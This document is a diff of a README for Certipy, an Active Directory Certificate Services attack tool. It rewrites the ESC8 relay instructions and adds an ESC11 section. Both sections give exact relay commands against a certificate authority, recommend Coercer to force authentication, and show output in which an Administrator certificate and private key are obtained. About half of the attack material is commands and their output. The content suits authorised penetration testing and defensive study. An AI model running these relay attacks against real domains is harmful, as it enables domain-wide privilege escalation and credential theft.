@@ -763,17 +763,17 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 ESC8 is when an Enrollment Service has installed and enabled Web Enrollment via HTTP.
 
-To start the relay server, we can run the `relay` command and specify the CA's IP in `-ca`.
+To start the relay server, we can run the `relay` command and specify the CA's IP in `-target http://<ip>`.
 
 By default, Certipy will request a certificate based on the `Machine` or `User` template depending on whether the relayed account name ends with `$`. It is possible to specify another template with the `-template` parameter.
 
-We can then use a technique such as [PetitPotam](https://github.com/ly4k/PetitPotam) to coerce authentication. For domain controllers, we must specify `-template DomainController`.
+We can then use a tool such as [Coercer](https://github.com/p0dalirius/Coercer) to coerce authentication. For domain controllers, we must specify `-template DomainController`.
 
 ```bash
-$ certipy relay -ca ca.corp.local
-Certipy v4.0.0 - by Oliver Lyak (ly4k)
+$ certipy relay -target 'http://ca.corp.local'
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
 
-[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
+[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp (ESC8)
 [*] Listening on 0.0.0.0:445
 [*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
 [*] Got certificate with UPN 'Administrator@corp.local'
@@ -788,10 +788,31 @@ ESC9 and ESC10 is not related to any specific Certipy commands or parameters, bu
 
 #### ESC11
 
-ESC11 can be abused with impacket's ntlmrelayx:
+ESC11 is when the certificate authority is not configured with IF_ENFORCEENCRYPTICERTREQUEST. This makes the RPC service vulnerable to NTLM relay attacks without signing, such as via SMB. The attack is similar to ESC8, except that we're targeting the RPC protocol instead of the HTTP protocol.
+
+To start the relay server, we can run the `relay` command and specify the CA's IP in `-target rpc://<ip>`. We must also specify the name of the certificate authority in `-ca <name>`.
+
+By default, Certipy will request a certificate based on the `Machine` or `User` template depending on whether the relayed account name ends with `$`. It is possible to specify another template with the `-template` parameter.
+
+We can then use a tool such as [Coercer](https://github.com/p0dalirius/Coercer) to coerce authentication. For domain controllers, we must specify `-template DomainController`.
 
 ```bash
-$ ntlmrelayx.py -t rpc://ca.corp.local -rpc-mode ICPR -icpr-ca-name corp-DC-CA -smb2support
+$ certipy relay -target 'rpc://ca.corp.local' -ca 'corp-ca'
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting rpc://ca.corp.local (ESC11)
+[*] Listening on 0.0.0.0:445
+[*] Connecting to ncacn_ip_tcp:ca.corp.local[135] to determine ICPR stringbinding
+[*] Attacking user 'Administrator@CORP'
+[*] Template was not defined. Defaulting to Machine/User
+[*] Requesting certificate for user 'Administrator' with template 'User'
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 1
+[*] Got certificate with UPN 'Administrator@corp.local'
+[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
+[*] Saved certificate and private key to 'administrator.pfx'
+[*] Exiting...
 ```
 
 ## Contact
